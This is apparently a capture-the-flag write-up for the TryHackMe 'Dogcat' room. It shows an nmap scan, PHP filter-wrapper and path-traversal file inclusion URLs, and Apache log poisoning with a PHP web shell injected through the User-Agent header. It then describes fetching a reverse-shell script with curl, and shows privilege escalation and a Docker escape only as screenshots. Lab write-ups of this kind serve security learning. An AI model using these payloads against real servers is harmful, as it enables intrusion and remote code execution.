# Dogcat 

[Link to room](https://tryhackme.com/room/dogcat)

## Enumeration

```nmap
# Nmap 7.80 scan initiated Sun Jun 28 04:10:22 2020 as: nmap -sC -sV -oN nmap.txt 10.10.129.248
Nmap scan report for 10.10.129.248
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 28 04:11:27 2020 -- 1 IP address (1 host up) scanned in 65.09 seconds
```

## Web Exploitation

After a little research i find out a way to bypass the php filter [check out this site](https://www.php.net/manual/en/wrappers.php.php)

Now lets read the index page, http://dogcat.thm/?view=php://filter/read=convert.base64-encode/resource=./dog/../index

![dogcat-1](https://github.com/strange07/tryhackme/blob/master/Dogcat/1.png)
but this is a base-64 encoded lets decode it
![dogcat-2](https://github.com/strange07/tryhackme/blob/master/Dogcat/2.png)
lets see whats in the index page 
![dogcat-3](https://github.com/strange07/tryhackme/blob/master/Dogcat/3.png)
The site checks if the “ext” parameter was provided, and if not it adds “.php” by default to our filename

1. What is flag 1?

http://dogcat.thm/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag
![dogcat-4](https://github.com/strange07/tryhackme/blob/master/Dogcat/4.png)
![dogcat-5](https://github.com/strange07/tryhackme/blob/master/Dogcat/5.png)
2. What is flag 2?

According to our nmap scan the server runs on Apache so let’s try to get code execution with log poisoning

The access log path for Apache is “/var/log/apache2/access.log”
lets try to read logs `/?view=./dog/../../../../../../../var/log/apache2/access.log&ext`

![dogcat-6](https://github.com/strange07/tryhackme/blob/master/Dogcat/6.png)
you can check page to source to better understand the logs
We can see that next to the route there is the User-Agent parameter

***lets insert a small php script for code excution***
i use `user agent switcher addon` to put the php code `<?php system($_GET['cmd']);?>`

![dogcat-7](https://github.com/strange07/tryhackme/blob/master/Dogcat/7.png)

Now lets check if that works `view-source:http://dogcat.thm/?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=whoami`

![dogcat-8](https://github.com/strange07/tryhackme/blob/master/Dogcat/8.png)

I tried getting a reverse shell by executing a command but that doesn't works so i use curl to download a script from my local computer and executed it from webpage to get the reverse shell.So lets try it

First we will run a python server and then we will use curl command to output the shell into shell.php on the server 

![dogcat-9](https://github.com/strange07/tryhackme/blob/master/Dogcat/9.png)
![dogcat-10](https://github.com/strange07/tryhackme/blob/master/Dogcat/10.png)
Now lets execute the shell.php by simply navigating to it
![dogcat-11](https://github.com/strange07/tryhackme/blob/master/Dogcat/11.png)
![dogcat-12](https://github.com/strange07/tryhackme/blob/master/Dogcat/12.png)

## Privilege Escalation

![dogcat-13](https://github.com/strange07/tryhackme/blob/master/Dogcat/13.png)

2. What is flag 2?

![dogcat-14](https://github.com/strange07/tryhackme/blob/master/Dogcat/14.png)

3. What is flag 3?

![dogcat-15](https://github.com/strange07/tryhackme/blob/master/Dogcat/15.png)

## Escaping Docker

![dogcat-16](https://github.com/strange07/tryhackme/blob/master/Dogcat/16.png)

4. What is Flag 4?

![dogcat-17](https://github.com/strange07/tryhackme/blob/master/Dogcat/17.png)
